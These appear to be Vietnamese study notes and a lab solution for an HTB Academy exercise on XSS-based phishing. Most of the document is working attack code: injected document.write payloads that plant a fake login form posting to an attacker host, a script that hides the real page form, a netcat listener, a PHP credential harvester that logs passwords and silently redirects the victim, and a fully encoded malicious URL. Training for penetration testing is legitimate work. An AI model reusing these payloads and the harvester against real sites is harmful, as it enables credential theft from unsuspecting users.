# XSS Phishing Attack ‚Äì HTB Academy (Rewritten & Enhanced)

## üìå M·ª•c L·ª•c

* [Gi·ªõi thi·ªáu](#gi·ªõi-thi·ªáu)
* [1. T·ªïng quan v·ªÅ XSS Phishing](#1-t·ªïng-quan-v·ªÅ-xss-phishing)
* [2. XSS Discovery (T√¨m payload ho·∫°t ƒë·ªông)](#2-xss-discovery-t√¨m-payload-ho·∫°t-ƒë·ªông)
* [3. T·∫°o Login Form Phishing](#3-t·∫°o-login-form-phishing)
* [4. ·∫®n ph·∫ßn t·ª≠ g·ªëc v√† l√†m trang tr√¥ng h·ª£p l·ªá](#4-·∫©n-ph·∫ßn-t·ª≠-g·ªëc-v√†-l√†m-trang-tr√¥ng-h·ª£p-l·ªá)
* [5. Comment-out HTML c√≤n s√≥t l·∫°i](#5-comment-out-html-c√≤n-s√≥t-l·∫°i)
* [6. L·∫Øng nghe v√† l·∫•y Credentials](#6-l·∫Øng-nghe-v√†-l·∫•y-credentials)
* [7. S·ª≠ d·ª•ng PHP Handler ƒë·ªÉ ·∫©n d·∫•u v·∫øt](#7-s·ª≠-d·ª•ng-php-handler-ƒë·ªÉ-·∫©n-d·∫•u-v·∫øt)
* [8. Workflow t·ªïng qu√°t (Flowchart)](#8-workflow-t·ªïng-qu√°t-flowchart)
* [9. V√≠ d·ª• th·ª±c chi·∫øn HTB/CPTS](#9-v√≠-d·ª•-th·ª±c-chi·∫øn-htbcpts)

---

## Gi·ªõi thi·ªáu

Phishing qua XSS l√† k·ªπ thu·∫≠t ch√®n **HTML + JavaScript ƒë·ªôc h·∫°i** v√†o trang web h·ª£p ph√°p ƒë·ªÉ hi·ªÉn th·ªã **login form gi·∫£**, t·ª´ ƒë√≥ ƒë√°nh c·∫Øp th√¥ng tin ng∆∞·ªùi d√πng.

M·ª•c ti√™u: khai th√°c l·ªó h·ªïng Reflected XSS trong ch·ª©c nƒÉng **Image URL Viewer (/phishing)**.

---

## 1. T·ªïng quan v·ªÅ XSS Phishing

* T·∫°o trang gi·∫£ nh∆∞ng n·∫±m trong website th·∫≠t (v√¨ XSS).
* Ng∆∞·ªùi d√πng tin t∆∞·ªüng v√† nh·∫≠p username/password.
* Form g·ª≠i th√¥ng tin v·ªÅ server c·ªßa attacker.
* Attacker ƒëƒÉng nh·∫≠p thay v√† chi·∫øm quy·ªÅn.

V√≠ d·ª• form phishing c∆° b·∫£n:

```html
<h3>Please login to continue</h3>
<form action="http://ATTACKER_IP">
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
</form>
```

---

## 2. XSS Discovery (T√¨m payload ho·∫°t ƒë·ªông)

T·∫°i `/phishing/index.php`, user nh·∫≠p URL h√¨nh ·∫£nh ‚Üí server render v√†o trang.

Payload test XSS:

```html
<script>alert(window.origin)</script>
```

N·∫øu kh√¥ng ch·∫°y ‚Üí xem source ‚Üí ki·ªÉm tra context ‚Üí t√¨m payload ph√π h·ª£p.

Sau khi t√¨m ƒë∆∞·ª£c payload XSS ho·∫°t ƒë·ªông ‚Üí ta nh√∫ng JavaScript sau:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP><input name=username><input name=password><input type=submit></form>')
```

---

## 3. T·∫°o Login Form Phishing

Sau khi t√¨m ƒë∆∞·ª£c XSS payload ‚Üí nh√©t HTML v√†o `document.write()`.

**Payload d·∫°ng n√©n 1 d√≤ng:**

```javascript
document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>')
```

Ch√®n payload v√†o tham s·ªë URL:

```
/phishing/index.php?url=<PAYLOAD_ENCODED>
```

---

## 4. ·∫®n ph·∫ßn t·ª≠ g·ªëc v√† l√†m trang tr√¥ng h·ª£p l·ªá

M·ª•c ti√™u: x√≥a form nh·∫≠p URL g·ªëc ƒë·ªÉ ng∆∞·ªùi d√πng nghƒ© l√† trang y√™u c·∫ßu login th·∫≠t.

HTML g·ªëc:

```html
<form role="form" action="index.php" method="GET" id="urlform">
    <input type="text" placeholder="Image URL" name="url">
</form>
```

D√πng JavaScript ƒë·ªÉ x√≥a n√≥:

```javascript
document.getElementById('urlform').remove();
```

Th√™m v√†o sau `document.write()`.

---

## 5. Comment-out HTML c√≤n s√≥t l·∫°i

ƒê·ªÉ ·∫©n ƒëo·∫°n HTML ph√≠a sau payload:

```html
<!--
```

Payload cu·ªëi c√πng tr√¥ng nh∆∞:

```javascript
document.write('...form...');document.getElementById('urlform').remove();<!--
```

Trang s·∫Ω tr√¥ng **nh∆∞ giao di·ªán login th·∫≠t s·ª±**.

---

## 6. L·∫Øng nghe v√† l·∫•y Credentials

D√πng netcat ƒë·ªÉ test nhanh:

```bash
sudo nc -lvnp 80
```

Khi victim nh·∫≠p:

```
username=test&password=test
```

Attacker s·∫Ω th·∫•y:

```
GET /?username=test&password=test HTTP/1.1
```

Nh∆∞·ª£c ƒëi·ªÉm: victim s·∫Ω nh·∫≠n l·ªói *Unable to connect* ‚Üí nghi ng·ªù.

---

## 7. S·ª≠ d·ª•ng PHP Handler ƒë·ªÉ ·∫©n d·∫•u v·∫øt

T·∫°o file `/tmp/tmpserver/index.php`:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Ch·∫°y server PHP:

```bash
sudo php -S 0.0.0.0:80
```

Check credentials:

```bash
cat creds.txt
```

Victim s·∫Ω ƒë∆∞·ª£c redirect l·∫°i trang th·∫≠t ‚Üí **kh√¥ng nghi ng·ªù**.

---

## 8. Workflow t·ªïng qu√°t (Flowchart)

```
[Find XSS] ‚Üí [Inject Login Form] ‚Üí [Hide Original Elements] ‚Üí [Obfuscate Payload]
        ‚Üì
 [Host Credential Stealer] ‚Üê [Victim enters creds]
        ‚Üì
 [Redirect victim back] ‚Üí [Use stolen creds]
```

---

## 9. V√≠ d·ª• th·ª±c chi·∫øn HTB/CPTS

1. T√¨m XSS payload v·ªõi XSStrike ho·∫∑c manual.
2. Encode payload ƒë·ªÉ nh√©t v√†o URL.
3. D·ª±ng server PHP ƒë·ªÉ nh·∫≠n credentials.
4. G·ª≠i link phishing qua `/phishing/send.php`.
5. L·∫•y password ‚Üí login `/phishing/login.php`.
6. L·∫•y flag.

---

## ‚úì T√†i li·ªáu ho√†n ch·ªânh

B·∫°n c√≥ th·ªÉ ti·∫øp t·ª•c y√™u c·∫ßu:

* T·∫°o b·∫£n n√¢ng cao
* Th√™m k·ªπ thu·∫≠t bypass WAF
* Th√™m obfuscation n√¢ng cao
* Th√™m payload cheat sheet
* Ho·∫∑c g·ªôp v√†o mega handbook CPTS

ƒê·ªÅ b√†i 
Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.

Gi·∫£i b√†i lab 

Payload 
document.write('<h3>Please login to continue</h3><form action=http://10.10.15.121><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');

-> http://10.129.234.166/phishing/index.php?url=document.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.15.121%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3B


M√£ PHP 
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://10.129.234.166/phishing/login.php");
    fclose($file);
    exit();
}
?>

T·∫°o file php v√† l·∫Øng nghe 
mkdir /tmp/tmpserver
cd /tmp/tmpserver
touch index.php # Paste php code
sudo php -S 0.0.0.0:80
